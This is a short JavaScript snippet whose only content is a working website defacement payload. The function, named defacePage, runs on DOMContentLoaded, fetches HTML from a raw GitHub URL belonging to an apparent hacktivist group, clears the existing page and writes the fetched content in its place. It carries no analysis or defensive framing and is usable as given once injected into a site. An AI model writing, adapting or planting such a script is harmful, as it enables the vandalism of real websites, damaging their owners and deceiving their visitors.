async function defacePage() {
    try {
        // URL of the HTML content you want to load
        const url = 'https://raw.githubusercontent.com/indiancybertroops/indiancybertroops.github.io/master/1337.html';
        
        // Fetch the content of the external HTML page
        const response = await fetch(url);
        
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }

        // Get the text of the HTML
        const htmlContent = await response.text();

        // Remove all the current HTML content
        document.documentElement.innerHTML = '';

        // Insert the fetched HTML content
        document.write(htmlContent);
        document.close();
    } catch (error) {
        console.error('Error fetching the HTML content:', error);
    }
}

// Call the function to replace the content when the DOM is fully loaded
document.addEventListener('DOMContentLoaded', defacePage);
